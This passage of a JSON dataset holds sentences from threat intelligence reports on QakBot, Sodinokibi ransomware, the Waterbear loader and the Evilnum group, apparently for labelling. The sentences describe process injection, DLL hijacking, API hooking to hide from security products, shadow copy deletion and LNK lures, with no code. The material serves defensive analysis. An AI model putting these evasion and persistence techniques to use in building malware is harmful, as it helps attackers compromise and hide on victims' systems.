        "text": "The Registry location can be seen in Figure 9 below.",
        "type": "",
        "report": "r-429",
        "line": 39,
        "index": 1186
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S40",
        "text": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "type": "",
        "report": "r-429",
        "line": 40,
        "index": 1187
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S41",
        "text": "QakBot will use process hollowing (T1055.012) in order to inject itself into explorer.exe.",
        "type": "",
        "report": "r-429",
        "line": 41,
        "index": 1188
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S42",
        "text": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "type": "",
        "report": "r-429",
        "line": 42,
        "index": 1189
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S43",
        "text": "The screen shot in Figure 11 illustrates the QakBot process name decryption routine.",
        "type": "",
        "report": "r-429",
        "line": 43,
        "index": 1190
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S44",
        "text": "Additionally, QakBot abuses the Service Control Manager (SCM) to create a child process, which is then detached from the parent when the SCM terminates the parent process.",
        "type": "",
        "report": "r-429",
        "line": 44,
        "index": 1191
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S45",
        "text": "QakBot C2 communications begin in this stage to make it more difficult to monitor.",
        "type": "",
        "report": "r-429",
        "line": 45,
        "index": 1192
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S46",
        "text": "Figure 13 below shows the SCM spawned process abuse technique.",
        "type": "",
        "report": "r-429",
        "line": 46,
        "index": 1193
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S47",
        "text": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "type": "",
        "report": "r-429",
        "line": 47,
        "index": 1194
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S48",
        "text": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "type": "",
        "report": "r-429",
        "line": 48,
        "index": 1195
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S49",
        "text": "The combined anti-analysis and evasion techniques across the infection chain significantly impair antivirus, EDR, and other security defenses from detecting and preventing the initial infection.",
        "type": "",
        "report": "r-429",
        "line": 49,
        "index": 1196
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S50",
        "text": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "type": "",
        "report": "r-429",
        "line": 50,
        "index": 1197
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S51",
        "text": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "type": "",
        "report": "r-429",
        "line": 51,
        "index": 1198
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S52",
        "text": "Additionally, there are a number of behavioral patterns, Indicators of Behavior (IOB), which provide opportunities for detection.",
        "type": "",
        "report": "r-429",
        "line": 52,
        "index": 1199
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S0",
        "text": "Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.\n",
        "type": "",
        "report": "r-430",
        "line": 0,
        "index": 1200
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S1",
        "text": "If the exp parameter in the configuration is set, the malware will attempt to exploit CVE-2018-8453 in order to gain SYSTEM privileges (see the \u201cPrivilege escalation\u201d section for more details).",
        "type": "",
        "report": "r-430",
        "line": 1,
        "index": 1201
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S2",
        "text": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.\n",
        "type": "",
        "report": "r-430",
        "line": 2,
        "index": 1202
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S3",
        "text": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "type": "",
        "report": "r-430",
        "line": 3,
        "index": 1203
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S4",
        "text": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:\n",
        "type": "",
        "report": "r-430",
        "line": 4,
        "index": 1204
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S5",
        "text": "Code Language 0x818 Romanian 0x419 Russian 0x819 Russian (Moldova) 0x422 Ukrainian 0x423 Belarusian 0x425 Estonian* 0x426 Latvian* 0x427 Lithuanian* 0x428 Tajik 0x429 Persian* 0x42B Armenian 0x42C Azeri 0x437 Georgian 0x43F Kazakh 0x440 Kygyz 0x442 Turkmen 0x443 Uzbek 0x444 Tatar 0x45A Syrian 0x2801 Arabic (Syria)\n",
        "type": "",
        "report": "r-430",
        "line": 5,
        "index": 1205
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S6",
        "text": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.\n",
        "type": "",
        "report": "r-430",
        "line": 6,
        "index": 1206
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S7",
        "text": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.\n",
        "type": "",
        "report": "r-430",
        "line": 7,
        "index": 1207
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S8",
        "text": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "type": "",
        "report": "r-430",
        "line": 8,
        "index": 1208
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S9",
        "text": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "type": "",
        "report": "r-430",
        "line": 9,
        "index": 1209
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S10",
        "text": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.\n",
        "type": "",
        "report": "r-430",
        "line": 10,
        "index": 1210
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S11",
        "text": "Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the rnd_ext value in the registry.",
        "type": "",
        "report": "r-430",
        "line": 11,
        "index": 1211
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S12",
        "text": "A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:\n",
        "type": "",
        "report": "r-430",
        "line": 12,
        "index": 1212
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S13",
        "text": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "type": "",
        "report": "r-430",
        "line": 13,
        "index": 1213
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S14",
        "text": "The key requested by the attackers is a combination of the victim\u2019s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded (see \u201cFile encryption\u201d section for more details).",
        "type": "",
        "report": "r-430",
        "line": 14,
        "index": 1214
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S15",
        "text": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "type": "",
        "report": "r-430",
        "line": 15,
        "index": 1215
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S0",
        "text": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "type": "",
        "report": "r-446",
        "line": 0,
        "index": 1216
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S1",
        "text": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "type": "",
        "report": "r-446",
        "line": 1,
        "index": 1217
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S2",
        "text": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "type": "",
        "report": "r-446",
        "line": 2,
        "index": 1218
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S3",
        "text": "If so, it retrieves the data inside it and loads the corresponding library.",
        "type": "",
        "report": "r-446",
        "line": 3,
        "index": 1219
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S4",
        "text": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "type": "",
        "report": "r-446",
        "line": 4,
        "index": 1220
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S5",
        "text": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "type": "",
        "report": "r-446",
        "line": 5,
        "index": 1221
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S6",
        "text": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.\n",
        "type": "",
        "report": "r-446",
        "line": 6,
        "index": 1222
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S7",
        "text": "Note: The image on the left shows how the DLL on a normal machine normally looks.",
        "type": "",
        "report": "r-446",
        "line": 7,
        "index": 1223
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S8",
        "text": "The image on the right showcases how the DLL on a victim's machine appears.",
        "type": "",
        "report": "r-446",
        "line": 8,
        "index": 1224
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S9",
        "text": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "type": "",
        "report": "r-446",
        "line": 9,
        "index": 1225
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S10",
        "text": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "type": "",
        "report": "r-446",
        "line": 10,
        "index": 1226
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S11",
        "text": "The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key.",
        "type": "",
        "report": "r-446",
        "line": 11,
        "index": 1227
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S12",
        "text": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "type": "",
        "report": "r-446",
        "line": 12,
        "index": 1228
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S13",
        "text": "In most cases, the payload is a first-stage backdoor, and its main purpose is to retrieve second-stage payloads \u2014 either by connecting to a C&C server or opening a port to wait for external connections and load incoming executables.",
        "type": "",
        "report": "r-446",
        "line": 13,
        "index": 1229
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S14",
        "text": "In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine.",
        "type": "",
        "report": "r-446",
        "line": 14,
        "index": 1230
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S15",
        "text": "Afterwards, whenever it needs to use a function, it will decrypt the function, execute it, and encrypt the function back again, as can be seen in Figure 4.",
        "type": "",
        "report": "r-446",
        "line": 15,
        "index": 1231
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S16",
        "text": "If a function will not be used on the rest of the execution, it will be scrambled by another mess-up function, as illustrated in Figure 6.",
        "type": "",
        "report": "r-446",
        "line": 16,
        "index": 1232
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S17",
        "text": "The mess-up function muddles up the bytes with random values and makes the input blocks unrecoverable.",
        "type": "",
        "report": "r-446",
        "line": 17,
        "index": 1233
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S18",
        "text": "The purpose of this is to further avoid being detected by a certain cybersecurity solution.",
        "type": "",
        "report": "r-446",
        "line": 18,
        "index": 1234
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S19",
        "text": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "type": "",
        "report": "r-446",
        "line": 19,
        "index": 1235
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S20",
        "text": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "type": "",
        "report": "r-446",
        "line": 20,
        "index": 1236
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S21",
        "text": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.\n",
        "type": "",
        "report": "r-446",
        "line": 21,
        "index": 1237
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S22",
        "text": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "type": "",
        "report": "r-446",
        "line": 22,
        "index": 1238
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S23",
        "text": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:\n",
        "type": "",
        "report": "r-446",
        "line": 23,
        "index": 1239
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S24",
        "text": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "type": "",
        "report": "r-446",
        "line": 24,
        "index": 1240
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S25",
        "text": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "type": "",
        "report": "r-446",
        "line": 25,
        "index": 1241
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S26",
        "text": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "type": "",
        "report": "r-446",
        "line": 26,
        "index": 1242
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S27",
        "text": "Note that only the thread would be terminated, but the service would still be running.\n",
        "type": "",
        "report": "r-446",
        "line": 27,
        "index": 1243
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S28",
        "text": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.\n",
        "type": "",
        "report": "r-446",
        "line": 28,
        "index": 1244
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S29",
        "text": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "type": "",
        "report": "r-446",
        "line": 29,
        "index": 1245
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S30",
        "text": "It hooks two different APIs, namely \"ZwOpenProcess\" and \"GetExtendedTcpTable\", to hide its specific processes.",
        "type": "",
        "report": "r-446",
        "line": 30,
        "index": 1246
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S31",
        "text": "The payload only modifies the functions in the memory of the security product process, hence the original system DLL files remain unchanged.",
        "type": "",
        "report": "r-446",
        "line": 31,
        "index": 1247
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S32",
        "text": "The payload is composed of a two-stage shellcode.",
        "type": "",
        "report": "r-446",
        "line": 32,
        "index": 1248
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S33",
        "text": "The first-stage shellcode finds a specific security product's process with a hardcoded name and injects the second-stage shellcode into that process.",
        "type": "",
        "report": "r-446",
        "line": 33,
        "index": 1249
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S34",
        "text": "The second-stage shellcode then performs API hooking inside the targeted process.\n",
        "type": "",
        "report": "r-446",
        "line": 34,
        "index": 1250
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S35",
        "text": "The process identifiers or PIDs to be hidden are stored in the shared memory \"Global\\<computer_name>.\"",
        "type": "",
        "report": "r-446",
        "line": 35,
        "index": 1251
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S36",
        "text": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "type": "",
        "report": "r-446",
        "line": 36,
        "index": 1252
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S37",
        "text": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "type": "",
        "report": "r-446",
        "line": 37,
        "index": 1253
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S38",
        "text": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "type": "",
        "report": "r-446",
        "line": 38,
        "index": 1254
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S39",
        "text": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "type": "",
        "report": "r-446",
        "line": 39,
        "index": 1255
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S40",
        "text": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "type": "",
        "report": "r-446",
        "line": 40,
        "index": 1256
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S41",
        "text": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "type": "",
        "report": "r-446",
        "line": 41,
        "index": 1257
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S42",
        "text": "First, it builds the hooked function and writes the function at the end of \u201cntdll.dll\u201d.",
        "type": "",
        "report": "r-446",
        "line": 42,
        "index": 1258
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S43",
        "text": "This function includes two parts, as shown in Figure 9:\n",
        "type": "",
        "report": "r-446",
        "line": 43,
        "index": 1259
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S44",
        "text": "The PID checking procedure.",
        "type": "",
        "report": "r-446",
        "line": 44,
        "index": 1260
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S45",
        "text": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "type": "",
        "report": "r-446",
        "line": 45,
        "index": 1261
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S46",
        "text": "If yes, it replaces the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning.",
        "type": "",
        "report": "r-446",
        "line": 46,
        "index": 1262
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S47",
        "text": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.\n",
        "type": "",
        "report": "r-446",
        "line": 47,
        "index": 1263
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S48",
        "text": "Secondly, it writes \"push <ADDRESS> ret\" at the beginning of the original \u201cZwOpenProcess\u201d address.",
        "type": "",
        "report": "r-446",
        "line": 48,
        "index": 1264
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S49",
        "text": "Hence, when \u201cZwOpenProcess\u201d is called, the modified version of \u201cZwOpenProcess\u201d will be executed.",
        "type": "",
        "report": "r-446",
        "line": 49,
        "index": 1265
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S50",
        "text": "The API hooking on \u201cZwOpenProcess\u201d will only be triggered if \"%temp%\\KERNELBASE.dll\" exists on the host.",
        "type": "",
        "report": "r-446",
        "line": 50,
        "index": 1266
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S51",
        "text": "It is possible that this check is designed according to the nature of the security product it targets.",
        "type": "",
        "report": "r-446",
        "line": 51,
        "index": 1267
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S52",
        "text": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "type": "",
        "report": "r-446",
        "line": 52,
        "index": 1268
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S53",
        "text": "\u201cGetExtendedTcpTable\u201d is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat.",
        "type": "",
        "report": "r-446",
        "line": 53,
        "index": 1269
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S54",
        "text": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "type": "",
        "report": "r-446",
        "line": 54,
        "index": 1270
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S55",
        "text": "In order to achieve that, it modifies two functions: \u201cGetExtendedTcpTable\u201d and \u201cGetRTTAndHopCount.\u201d",
        "type": "",
        "report": "r-446",
        "line": 55,
        "index": 1271
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S56",
        "text": "The second function, \u201cGetRTTAndHopCount,\u201d acts as the place to put the injected hooking code.",
        "type": "",
        "report": "r-446",
        "line": 56,
        "index": 1272
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S57",
        "text": "\u201cGetExtendedTcpTable\u201d only writes a jump to \u201cGetRTTAndHopCount\u201d in the beginning of the function.",
        "type": "",
        "report": "r-446",
        "line": 57,
        "index": 1273
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S58",
        "text": "Only the first 5 bytes of the code of the API \"GetExtendedTcpTable\" are changed, as shown in Figure 11.\n",
        "type": "",
        "report": "r-446",
        "line": 58,
        "index": 1274
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S59",
        "text": "The rest of the routine is all placed in \u201cGetRTTAndHopCount.\u201d",
        "type": "",
        "report": "r-446",
        "line": 59,
        "index": 1275
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S60",
        "text": "In the first part of the code, it pushes [\u201cGetRTTAndHopCount\u201d+0x3E] as the return address and then executes the first four instructions of the original \u201cGetExtendedTcpTable\u201d function (which has already been replaced by the jump instruction in Figure 11).",
        "type": "",
        "report": "r-446",
        "line": 60,
        "index": 1276
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S61",
        "text": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "type": "",
        "report": "r-446",
        "line": 61,
        "index": 1277
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S62",
        "text": "The code is shown in Figure 12.\n",
        "type": "",
        "report": "r-446",
        "line": 62,
        "index": 1278
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S63",
        "text": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code, it iteratively checks every record in the returned Tcp table.",
        "type": "",
        "report": "r-446",
        "line": 63,
        "index": 1279
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S64",
        "text": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "type": "",
        "report": "r-446",
        "line": 64,
        "index": 1280
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S65",
        "text": "In the end, it returns the modified table.",
        "type": "",
        "report": "r-446",
        "line": 65,
        "index": 1281
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S66",
        "text": "Rather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difficult, especially since both functions still work and return results normally.",
        "type": "",
        "report": "r-446",
        "line": 66,
        "index": 1282
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S67",
        "text": "Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products.",
        "type": "",
        "report": "r-446",
        "line": 67,
        "index": 1283
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S0",
        "text": "Targets are approached with spearphishing emails that contain a link to a ZIP file hosted on Google Drive.",
        "type": "",
        "report": "r-492",
        "line": 0,
        "index": 1284
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S1",
        "text": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "type": "",
        "report": "r-492",
        "line": 1,
        "index": 1285
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S2",
        "text": "These shortcut files have \u201cdouble extensions\u201d to try to trick the user into opening them, thinking they are benign documents or pictures (in Windows, file extensions for known file types are hidden by default).",
        "type": "",
        "report": "r-492",
        "line": 2,
        "index": 1286
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S3",
        "text": "The contents of one of the ZIP files are shown in Figure 1.\n",
        "type": "",
        "report": "r-492",
        "line": 3,
        "index": 1287
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S4",
        "text": "Once a shortcut file is opened (it doesn\u2019t matter which one, as they all do the same thing), it looks in the contents of its own file for lines with a specific marker and writes them to a .js file.",
        "type": "",
        "report": "r-492",
        "line": 4,
        "index": 1288
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S5",
        "text": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "type": "",
        "report": "r-492",
        "line": 5,
        "index": 1289
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S6",
        "text": "It also deletes the shortcut file.",
        "type": "",
        "report": "r-492",
        "line": 6,
        "index": 1290
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S7",
        "text": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "type": "",
        "report": "r-492",
        "line": 7,
        "index": 1291
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S8",
        "text": "One such decoy is shown in Figure 2 (blurred for privacy).",
        "type": "",
        "report": "r-492",
        "line": 8,
        "index": 1292
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S9",
        "text": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "type": "",
        "report": "r-492",
        "line": 9,
        "index": 1293
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S10",
        "text": "Documents are collected actively in the group\u2019s current operations, as it targets technical support representatives and account managers, who regularly receive these kinds of documents from their customers.",
        "type": "",
        "report": "r-492",
        "line": 10,
        "index": 1294
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S11",
        "text": "The group reuses the documents on different targets, unless the targets are from different regions.\n",
        "type": "",
        "report": "r-492",
        "line": 11,
        "index": 1295
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S12",
        "text": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "type": "",
        "report": "r-492",
        "line": 12,
        "index": 1296
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S13",
        "text": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "type": "",
        "report": "r-492",
        "line": 13,
        "index": 1297
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S14",
        "text": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "type": "",
        "report": "r-492",
        "line": 14,
        "index": 1298
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S15",
        "text": "An overview of these is shown in Figure 3.\n",
        "type": "",
        "report": "r-492",
        "line": 15,
        "index": 1299
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S16",
        "text": "Each of the various components has its own C&C server, and each component operates independently.",
        "type": "",
        "report": "r-492",
        "line": 16,
        "index": 1300
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S17",
        "text": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.\n",
        "type": "",
        "report": "r-492",
        "line": 17,
        "index": 1301
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S18",
        "text": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "type": "",
        "report": "r-492",
        "line": 18,
        "index": 1302
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S19",
        "text": "The only exceptions are the C&C servers used by the Golden Chickens components; malware purchased from a MaaS provider, as we describe later.",
        "type": "",
        "report": "r-492",
        "line": 19,
        "index": 1303
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S20",
        "text": "Those referenced by an IP address can be split into two groups, based on the hosting provider.",
        "type": "",
        "report": "r-492",
        "line": 20,
        "index": 1304
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S21",
        "text": "The majority of them are hosted with FreeHost, a Ukrainian provider.",
        "type": "",
        "report": "r-492",
        "line": 21,
        "index": 1305
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S22",
        "text": "The rest are hosted in the Netherlands, with Dotsi.\n",
        "type": "",
        "report": "r-492",
        "line": 22,
        "index": 1306
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S23",
        "text": "This component communicates with a C&C server and acts as a backdoor without the need for any additional program.",
        "type": "",
        "report": "r-492",
        "line": 23,
        "index": 1307
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S24",
        "text": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.\n",
        "type": "",
        "report": "r-492",
        "line": 24,
        "index": 1308
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S25",
        "text": "The first known mention of this JavaScript malware was in May 2018 in this pwncode article.",
        "type": "",
        "report": "r-492",
        "line": 25,
        "index": 1309
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S26",
        "text": "The malware has changed since then and we illustrate these changes in Figure 4.\n",
        "type": "",
        "report": "r-492",
        "line": 26,
        "index": 1310
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S27",
        "text": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "type": "",
        "report": "r-492",
        "line": 27,
        "index": 1311
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S28",
        "text": "In that early version it was not possible to upload files to the C&C, only to download files to the victim\u2019s computer.",
        "type": "",
        "report": "r-492",
        "line": 28,
        "index": 1312
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S29",
        "text": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.\n",
        "type": "",
        "report": "r-492",
        "line": 29,
        "index": 1313
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S30",
        "text": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "type": "",
        "report": "r-492",
        "line": 30,
        "index": 1314
    },
